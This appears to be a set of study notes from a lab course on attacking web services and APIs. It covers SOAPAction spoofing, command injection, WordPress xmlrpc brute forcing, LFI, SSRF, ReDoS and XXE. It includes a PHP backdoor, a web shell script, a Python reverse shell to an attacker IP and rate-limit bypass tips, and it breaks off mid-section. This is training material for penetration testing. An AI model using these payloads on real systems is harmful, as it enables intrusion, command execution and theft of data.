# WSDL

WSDL stands for Web Service Description Language. WSDL is an XML-based file exposed by web services that informs clients of the provided services/methods, including where they reside and the method-calling convention.

A web service's WSDL file should not always be accessible. Developers may not want to publicly expose a web service's WSDL file, or they may expose it through an uncommon location, **following a security through obscurity approach**. In the latter case, directory/parameter fuzzing may reveal the location and content of a WSDL file.

Suppose we are assessing a SOAP service residing in ```http://<TARGET IP>:3002```. We have not been informed of a WSDL file. Let us start by performing basic directory fuzzing against the web service.

```bash
dirb http://<TARGET IP>:3002
```

It looks like ```http://<TARGET IP>:3002/wsdl``` exists. Let us inspect its content as follows:

```bash
curl http://<TARGET IP>:3002/wsdl 
```

The response is empty! Maybe there is a parameter that will provide us with access to the SOAP web service's WSDL file. Let us perform parameter fuzzing using ffuf and the burp-parameter-names.txt list, as follows. -fs 0 filters out empty responses (size = 0) and -mc 200 matches HTTP 200 responses:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://<TARGET IP>:3002/wsdl?FUZZ' -fs 0 -mc 200
```

It looks like **wsdl is a valid parameter**. Let us now issue a request for ```http://<TARGET IP>:3002/wsdl?wsdl```:

```bash
curl http://<TARGET IP>:3002/wsdl?wsdl
```

### WSDL file breakdown

The above WSDL file follows the WSDL version 1.1 layout and consists of the following elements:
- **Definition**: The root element of all WSDL files. Inside the definition, the name of the web service is specified, all namespaces used across the WSDL document are declared, and all other service elements are defined;
    ```xml
    <wsdl:definitions targetNamespace="http://tempuri.org/" 

        <wsdl:types></wsdl:types>
        <wsdl:message name="LoginSoapIn"></wsdl:message>
        <wsdl:portType name="HacktheBoxSoapPort">
        <wsdl:operation name="Login"></wsdl:operation>
        </wsdl:portType>
        <wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
        <wsdl:operation name="Login">
            <soap:operation soapAction="Login" style="document"/>
            <wsdl:input></wsdl:input>
            <wsdl:output></wsdl:output>
        </wsdl:operation>
        </wsdl:binding>
        <wsdl:service name="HacktheboxService"></wsdl:service>

    </wsdl:definitions>
    ```

- **Data types**: The data types to be used in the exchanged messages;
    ```xml
    <wsdl:types>

        <s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
        <s:element name="LoginRequest">
            <s:complexType>
                <s:sequence>
                    <s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
                    <s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
                </s:sequence>
            </s:complexType>
        </s:element>
        <s:element name="LoginResponse">
            <s:complexType>
                <s:sequence>
                    <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
                </s:sequence>
            </s:complexType>
        </s:element>
        <s:element name="ExecuteCommandRequest">
            <s:complexType>
                <s:sequence>
                    <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
                </s:sequence>
            </s:complexType>
        </s:element>
        <s:element name="ExecuteCommandResponse">
            <s:complexType>
                <s:sequence>
                    <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
                </s:sequence>
            </s:complexType>
        </s:element>
        </s:schema>
        
    </wsdl:types>
    ```

- **Messages**: Defines input and output operations that the web service supports. In other words, through the messages element, the messages to be exchanged, are defined and presented either as an entire document or as arguments to be mapped to a method invocation;

    ```xml
    <!-- Login Messages -->
    <wsdl:message name="LoginSoapIn">
        <wsdl:part name="parameters" element="tns:LoginRequest"/>
    </wsdl:message>
    <wsdl:message name="LoginSoapOut">
        <wsdl:part name="parameters" element="tns:LoginResponse"/>
    </wsdl:message>
    <!-- ExecuteCommand Messages -->
    <wsdl:message name="ExecuteCommandSoapIn">
        <wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
    </wsdl:message>
    <wsdl:message name="ExecuteCommandSoapOut">
        <wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
    </wsdl:message>
    ```

- **Operation**: Defines the available SOAP actions alongside the encoding of each message;
- **Port type**: Encapsulates every possible input and output message into an operation. More specifically, it defines the web service, the available operations and the exchanged messages. Please note that in WSDL version 2.0, the interface element is tasked with defining the available operations and when it comes to messages the (data) types element handles defining them;
    ```xml
    <wsdl:portType name="HacktheBoxSoapPort">

        <!-- Login Operaion | PORT -->
        <wsdl:operation name="Login">
            <wsdl:input message="tns:LoginSoapIn"/>
            <wsdl:output message="tns:LoginSoapOut"/>
        </wsdl:operation>
        <!-- ExecuteCommand Operation | PORT -->
        <wsdl:operation name="ExecuteCommand">
            <wsdl:input message="tns:ExecuteCommandSoapIn"/>
            <wsdl:output message="tns:ExecuteCommandSoapOut"/>
        </wsdl:operation>
    
    </wsdl:portType>
    ```

- **Binding**: Binds the operation to a particular port type. Think of bindings as interfaces. A client will call the relevant port type and, using the details provided by the binding, will be able to access the operations bound to this port type. In other words, bindings provide web service access details, such as the message format, operations, messages, and interfaces (in the case of WSDL version 2.0);

    ```xml
    <wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">

        <soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
        <!-- SOAP Login Action -->
        <wsdl:operation name="Login">
        <soap:operation soapAction="Login" style="document"/>
        <wsdl:input>
            <soap:body use="literal"/>
        </wsdl:input>
        <wsdl:output>
            <soap:body use="literal"/>
        </wsdl:output>
        </wsdl:operation>
        <!-- SOAP ExecuteCommand Action -->
        <wsdl:operation name="ExecuteCommand">
        <soap:operation soapAction="ExecuteCommand" style="document"/>
        <wsdl:input>
            <soap:body use="literal"/>
        </wsdl:input>
        <wsdl:output>
            <soap:body use="literal"/>
        </wsdl:output>
        </wsdl:operation>

    </wsdl:binding>
    ```

- **Service**: A client makes a call to the web service through the name of the service specified in the service tag. Through this element, the client identifies the location of the web service.

    ```xml
    <wsdl:service name="HacktheboxService">

        <wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
            <soap:address location="http://localhost:80/wsdl"/>
        </wsdl:port>

    </wsdl:service>
    ```

<br>
<br>
<br>
<br>

# SOAPAction spoofing

SOAP messages towards a SOAP service should include both the operation and the related parameters. 

This operation resides in the first child element of the SOAP message's body. **If HTTP is the transport of choice, it is allowed to use an additional HTTP header called SOAPAction**, which contains the operation's name.

The receiving web service can identify the operation within the SOAP body through this header without parsing any XML.

If a web service considers only the SOAPAction attribute when determining the operation to execute, then it may be vulnerable to SOAPAction spoofing.

Suppose we are assessing a SOAP web service, whose WSDL file resides in ```http://<TARGET IP>:3002/wsdl?wsdl```.

The first thing to pay attention to is the following:

```xml
<wsdl:operation name="ExecuteCommand">
<soap:operation soapAction="ExecuteCommand" style="document"/>
```

We can see a SOAPAction operation called ExecuteCommand.

Let us take a look at the parameters:

```xml
<s:element name="ExecuteCommandRequest">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
```

We notice that there is a ```cmd parameter```. Let us build a Python script to issue requests (save it as client.py). Note that the below script will try to have the SOAP service execute a whoami command:

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

We get an error mentioning This function is only allowed in internal networks. We have no access to the internal networks. Does this mean we are stuck? Not yet! **Let us try a SOAPAction spoofing attack**, as follows:

Let us build a new Python script for our SOAPAction spoofing attack (save it as client_soapaction_spoofing.py):
```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

- We specify ```LoginRequest in <soap:Body>```, so that our request goes through. This operation is allowed from the outside;
- We specify the parameters of ExecuteCommand because we want to have the SOAP service execute a whoami command;
- We specify the blocked operation (ExecuteCommand) in the SOAPAction header.


If the web service determines the operation to be executed based solely on the SOAPAction header, we may **bypass the restrictions and have the SOAP service execute a whoami command**.

<br>
<br>
<br>
<br>

# Command injection

Command injections are among the most critical vulnerabilities in web services. They allow system command execution directly on the back-end server. If a web service uses user-controlled input to execute a system command on the back-end server, an attacker may be able to inject a malicious payload to subvert the intended command and execute his own.


Suppose we are assessing such a connectivity-checking service residing in ```http://<TARGET IP>:3003/ping-server.php/ping```. Suppose we have also been provided with the source code of the service.

```php
<?php
function ping($host_url_ip, $packets) {
        if (!in_array($packets, array(1, 2, 3, 4))) {
                die('Only 1-4 packets!');
        }
        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url_ip);
        $delimiter = "\n" . str_repeat('-', 50) . "\n";
        echo $delimiter . implode($delimiter, array("Command:", $cmd, "Returned:", shell_exec($cmd)));
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $prt = explode('/', $_SERVER['PATH_INFO']);
        call_user_func_array($prt[1], array_slice($prt, 2));
}
?>
```

A function called ping is defined, which takes two arguments: host_url_ip and packets. 

The request should look similar to the following. ```http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3```.

To check that the web service is sending ping requests, execute the below in your attacking machine and then issue the request:

```bash
sudo tcpdump -i tun0 icmp
```

The code also checks if the packets's value is more than 4, and it does that via an array. So if we issue a request such as ```http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3333```, we're going to get an Only 1-4 packets! error.

A variable called cmd is then created, which forms the ping command to be executed. Two values are "parsed", packets and host_url. escapeshellarg() is used to escape the host_url's value. According to PHP's function reference, escapeshellarg() adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument. This function should be used to escape individual arguments to shell functions coming from user input. The shell functions include exec(), system() shell_exec() and the backtick operator.

The command specified by the cmd parameter is executed with the help of the shell_exec() PHP function.

If the request method is GET, an existing function can be called with the help of call_user_func_array(). The call_user_func_array() function is a special way to call an existing PHP function. It takes a function to call as its first parameter, then takes an array of parameters as its second parameter. This means that instead of ```http://<TARGET IP>:3003/ping-server.php/ping/www.example.com/3``` an attacker could issue a request as follows: ```http://<TARGET IP>:3003/ping-server.php/system/ls```. This constitutes a command injection vulnerability!

You can test the command injection vulnerability as follows:

```bash
curl http://<TARGET IP>:3003/ping-server.php/system/ls
```

<br>
<br>
<br>
<br>

# Attacking WordPress 'xmlrpc.php'

It is important to note that xmlrpc.php being enabled on a WordPress instance is not a vulnerability. Depending on the methods allowed, xmlrpc.php can facilitate some enumeration and exploitation activities, though.

Suppose we are assessing the security of a WordPress instance residing in ```http://blog.inlanefreight.com```. Through enumeration activities, we identified a valid username, admin, and that ```xmlrpc.php is enabled```. Identifying if xmlrpc.php is enabled is as easy as requesting xmlrpc.php on the domain we are assessing.

We can mount a password brute-forcing attack through xmlrpc.php, as follows:

```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

You may ask how we identified the correct method to call (**system.listMethods**). We did that by going **through the well-documented Wordpress code** and interacting with xmlrpc.php, as follows:

```bash
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php




<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

Inside the list of available methods above, pingback.ping is included. pingback.ping allows for XML-RPC pingbacks. According to WordPress, a pingback is a special type of comment that’s created when you link to another blog post, as long as the other blog is set to accept pingbacks.

Unfortunately, if pingbacks are available, they can facilitate:
- **IP Disclosure** - An attacker can call the pingback.ping method on a WordPress instance behind Cloudflare to identify its public IP. The pingback should point to an attacker-controlled host (such as a VPS) accessible by the WordPress instance.
- **Cross-Site Port Attack (XSPA)** - An attacker can call the pingback.ping method on a WordPress instance against itself (or other internal hosts) on different ports. Open ports or internal hosts can be identified by looking for response time differences or response differences;
- **Distributed Denial of Service Attack (DDoS)** - An attacker can call the pingback.ping method on numerous WordPress instances against a single target.

Find below how an **IP Disclosure attack could be mounted if xmlrpc.php is enabled and the pingback.ping method is available**. XSPA and DDoS attacks can be mounted similarly.

Suppose that the WordPress instance residing in http://blog.inlanefreight.com is protected by Cloudflare. As we already identified, it also has xmlrpc.php enabled, and the pingback.ping method is available.

As soon as the below request is sent, the attacker-controlled host will receive a request (pingback) originating from ```http://blog.inlanefreight.com```, verifying the pingback and exposing ```http://blog.inlanefreight.com```'s public IP address.

```http
--> POST /xmlrpc.php HTTP/1.1 
Host: blog.inlanefreight.com 
Connection: keep-alive 
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://attacker-controlled-host.com/</string></value>
</param>
<param>
<value><string>https://blog.inlanefreight.com/2015/10/what-is-cybersecurity/</string></value>
</param>
</params>
</methodCall>
```


<br>
<br>
<br>
<br>

# Information disclosure

Suppose we are assessing an API residing in ```http://<TARGET IP>:3003```.

Maybe there is a parameter that will reveal the API's functionality. Let us perform parameter fuzzing using ffuf and the burp-parameter-names.txt list, as follows:

```bash
ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value'
```

It looks like id is a valid parameter. Let us check the response when specifying id as a parameter and a test value:

```bash
curl http://<TARGET IP>:3003/?id=1
```

Find below a Python script that could automate retrieving all information that the API returns (save it as brute_api.py):

```python
import requests, sys

def brute():
    try:
        value = range(10000)
        for val in value:
            url = sys.argv[1]
            r = requests.get(url + '/?id='+str(val))
            if "position" in r.text:
                print("Number found!", val)
                print(r.text)
    except IndexError:
        print("Enter a URL E.g.: http://<TARGET IP>:3003/")

brute()
```

- We import two modules requests and sys. requests allows us to make HTTP requests (GET, POST, etc.), and sys allows us to parse system arguments;
- We define a function called ```brute```, and then we define a variable called ```value``` which has a range of 10000. try and except help in exception handling;
- ```url = sys.argv[1]``` receives the first argument;
- r = ```requests.get(url + '/?id='+str(val))``` creates a response object called r which will allow us to get the response of our GET request. We are just appending ```/?id=``` to our request and then val follows, which will have a value in the specified range;
- ```if "position" in r.text:``` looks for the position string in the response. If we enter a valid ID, it will return the position and other information. If we don't, it will return ```[]```.

The above script can be run, as follows:
```bash
 python3 brute_api.py http://<TARGET IP>:3003
```



**TIP**: If there is a rate limit in place, you can always try to bypass it through headers such as X-Forwarded-For, X-Forwarded-IP, etc., or use proxies. These headers have to be compared with an IP most of the time. See an example below:

```php
<?php
$whitelist = array("127.0.0.1", "1.3.3.7");
if(!(in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $whitelist)))
{
    header("HTTP/1.1 401 Unauthorized");
}
else
{
  print("Hello Developer team! As you know, we are working on building a way for users to see website pages in real pages but behind our own Proxies!");
}
```

The issue here is that the code compares the **HTTP_X_FORWARDED_FOR** header to the possible whitelist values, and if the HTTP_X_FORWARDED_FOR is not set or is set without one of the IPs from the array, it'll give a 401. A possible bypass could be setting the X-Forwarded-For header and the value to one of the IPs from the array.

In addition, you can find that a parameter like "id" in the example above, could be injectable with a SQLi. you can use **SQLMap** to obtain some informations about the vulnerability. This can be the resulting curl:

```bash
curl http://10.129.153.22:3003\?id\=\1+or+position=736373
```

<br>
<br>
<br>
<br>

# Arbitrary file upload

Arbitrary file uploads are among the most critical vulnerabilities. These flaws enable attackers to upload malicious files, execute arbitrary commands on the back-end server, and even take control over the entire server. Arbitrary file upload vulnerabilities affect web applications and APIs alike.

Suppose we are assessing an application residing in ```http://<TARGET IP>:3001```.

When we browse the application, an anonymous file uploading functionality sticks out.

Let us create the below file (save it as backdoor.php) and try to upload it via the available functionality.

```php
<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>
```

The above allows us to append the parameter cmd to our request (to backdoor.php), which will be executed using system(). This is if we can determine backdoor.php's location, if backdoor.php will be rendered successfully and if no PHP function restrictions exist.

- backdoor.php was successfully uploaded via a POST request to /api/upload/. An API seems to be handling the file uploading functionality of the application;
- The content type has been automatically set to application/x-php, which means there is no protection in place. The content type would probably be set to application/octet-stream or text/plain if there was one;
- Uploading a file with a .php extension is also allowed. If there was a limitation on the extensions, we could try extensions such as .jpg.php, .PHP, etc;
- Using something like file_get_contents() to identify php code being uploaded seems not in place either;
- We also receive the location where our file is stored, ```http://<TARGET IP>:3001/uploads/backdoor.php```.

We can use the below Python script (save it as web_shell.py) to obtain a shell, leveraging the uploaded backdoor.php file:

```python
import argparse, time, requests, os # imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands)
parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs") # generates a variable called parser and uses argparse to create a description
parser.add_argument("-t", "--target", help="Specify the target host E.g. http://<TARGET IP>:3001/uploads/backdoor.php", required=True) # specifies flags such as -t for a target with a help and required option being true
parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload") # similar to above
parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes") # similar to above
args = parser.parse_args() # defines args as a variable holding the values of the above arguments so we can do args.option for example.
if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
    parser.print_help() # shows help menu
elif args.target and args.payload: # elif (if they both have values do some action)
    print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell)
    os.system("clear") # clear the screen (linux)
    while True: # starts a while loop (never ending loop)
        try: # try statement
            cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
            print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
            time.sleep(0.3) # waits 0.3 seconds during each request
        except requests.exceptions.InvalidSchema: # error handling
            print("Invalid URL Schema: http:// or https://")
        except requests.exceptions.ConnectionError: # error handling
            print("URL is invalid")
```

Use the script as follows:
```bash
python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
```

To obtain a more functional (reverse) shell, execute the below inside the shell gained through the Python script above. **Ensure that an active listener (such as Netcat) is in place before executing the below**:

```python3
python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes


python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPN/TUN Adapter IP>",<LISTENER PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

<br>
<br>
<br>
<br>

# Local file inclusion

Local File Inclusion (LFI) is an attack that affects web applications and APIs alike. It allows an attacker to read internal files and sometimes execute code on the server via a series of ways, one being Apache Log Poisoning.

Let us assess together an API that is vulnerable to Local File Inclusion.

Suppose we are assessing such an API residing in ```http://<TARGET IP>:3000/api```.

```bash
curl http://<TARGET IP>:3000/api


{"status":"UP"}
```

We don't see anything helpful except the indication that the API is up and running. Let us perform API endpoint fuzzing using ffuf and the common-api-endpoints-mazen160.txt list, as follows:

```bash
ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
```

It looks like /api/download is a valid API endpoint. Let us interact with it:

```bash
curl http://<TARGET IP>:3000/api/download


{"success":false,"error":"Input the filename via /download/<filename>"}
```

We need to specify a file, but we do not have any knowledge of stored files or their naming scheme. We can try mounting a Local File Inclusion (LFI) attack, though:

```bash
curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
```

The API is indeed vulnerable to Local File Inclusion!

<br>
<br>
<br>
<br>

# Cross site scripting (XSS)

Cross-Site Scripting (XSS) vulnerabilities affect web applications and APIs alike. An XSS vulnerability may allow an attacker to execute arbitrary JavaScript code within the target's browser and result in complete web application compromise if chained together with other vulnerabilities.

Suppose we are having a better look at the API of the previous section, ```http://<TARGET IP>:3000/api/download```.

Let us first interact with it through the browser by requesting the below:

```
http://<TARGET IP>:3000/api/download/test_value
```

```test_value``` is reflected in the response. Let us see what happens when we enter a payload such as the below (instead of ```test_value```).

```js
<script>alert(document.domain)</script>
```

It looks like the application is encoding the submitted payload. We can try URL-encoding our payload once and submitting it again.

<br>
<br>
<br>
<br>

# Server side request forgery (SSRF)

Server-Side Request Forgery (SSRF) attacks, listed in the OWASP top 10, allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. We usually need to supply or modify URLs used by the target application to read or submit data.

We can usually find SSRF vulnerabilities in applications or APIs that fetch remote resources.

Suppose we are assessing such an API residing in ```http://<TARGET IP>:3000/api/userinfo```.

```bash
curl http://<TARGET IP>:3000/api/userinfo


{"success":false,"error":"'id' parameter is not given."}
```

The API is expecting a parameter called id. Since we are interested in identifying SSRF vulnerabilities in this section, let us set up a Netcat listener first:

```bash
nc -nlvp 4444
```

Then, let us specify ```http://<VPN/TUN Adapter IP>:<LISTENER PORT>``` as the value of the id parameter and make an API call:

```bash
curl "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:<LISTENER PORT>"


{"success":false,"error":"'id' parameter is invalid."}
```

We notice an error about the id parameter being invalid, and we also notice no connection being made to our listener.

In many cases, APIs expect parameter values in a specific format/encoding. Let us try Base64-encoding ```http://<VPN/TUN Adapter IP>:<LISTENER PORT>``` and making an API call again:

```bash
curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
```

When you make the API call, you will notice a connection being made to your Netcat listener. The API is vulnerable to SSRF.

<br>
<br>
<br>
<br>

# ReDOS

Suppose we have a user that submits benign input to an API. On the server side, a developer could match any input against a regular expression. After a usually constant amount of time, the API responds. In some instances, an attacker may be able to cause significant delays in the API's response time by submitting a crafted payload that tries to exploit some particularities/inefficiencies of the regular expression matching engine.

The API resides in ```http://<TARGET IP>:3000/api/check-email``` and accepts a parameter called email.

```bash
curl "http://<TARGET IP>:3000/api/check-email?email=test_value"




{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
```

Submit the above regex to ```regex101.com``` for an in-depth explanation. Then, submit the above regex to ```https://jex.im/regulex/``` for a visualization.

The second and third groups are doing bad iterative checks.

Let's submit the following valid value and see how long the API takes to respond.

```bash
curl "http://<TARGET IP>:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."




{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
```

You will notice that the API takes several seconds to respond and that longer payloads increase the evaluation time.

The difference in response time between the first cURL command above and the second is significant.

The API is undoubtedly vulnerable to ReDoS attacks.

<br>
<br>
<br>
<br>

# XML external entity (XXE) injection

XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. XXE vulnerabilities can cause considerable damage to a web application and its back-end server, from disclosing sensitive files to shutting the back-end server down.

Suppose we are assessing such an application residing in ```http://<TARGET IP>:3001```.


By the time we browse ```http://<TARGET IP>:3001```, we come across an authentication page.

- Run Burp Suite;
- Now let us try authenticating;
    ```http
    POST /api/login/ HTTP/1.1
    Host: <TARGET IP>:3001
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: text/plain;charset=UTF-8
    Content-Length: 111
    Origin: http://<TARGET IP>:3001
    DNT: 1
    Connection: close
    Referer: http://<TARGET IP>:3001/
    Sec-GPC: 1

    <?xml version="1.0" encoding="UTF-8"?><root><email>test@test.com</email><password>P@ssw0rd123</password></root>
    ```
- We notice that an API is handling the user authentication functionality of the application;
- User authentication is generating XML data;
- Let us try crafting an exploit to read internal files such as /etc/passwd on the server;
- First, we will need to append a **DOCTYPE** to this request;


What is a DOCTYPE?

DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document. A DOCTYPE declaration can also be used to define special characters or strings used in the document. The DTD is declared within the optional DOCTYPE element at the start of the XML document. Internal DTDs exist, but DTDs can be loaded from an external resource (external DTD).

Our current payload is:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]>
<root>
<email>test@test.com</email>
<password>P@ssw0rd123</password>
</root>
```

We defined a DTD called pwn, and inside of that, we have an ENTITY. We may also define custom entities (i.e., XML variables) in XML DTDs to allow refactoring of variables and reduce repetitive data. This can be done using the ENTITY keyword, followed by the ENTITY name and its value.

We have called our external entity somename, and it will use the SYSTEM keyword, which must have the value of a URL, or we can try using a URI scheme/protocol such as file:// to call internal files.

Let us set up a Netcat listener as follows:

```bash
nc -nlvp 4444
```

Now let us make an API call containing the payload we crafted above:

```bash
curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>test@test.com</email><password>P@ssw0rd123</password></root>'



<p>Sorry, we cannot find a account with <b></b> email.</p>
```

We notice no connection being made to our listener. This is because we have defined our external entity, but we haven't tried to use it. We can do that as follows:

```bash
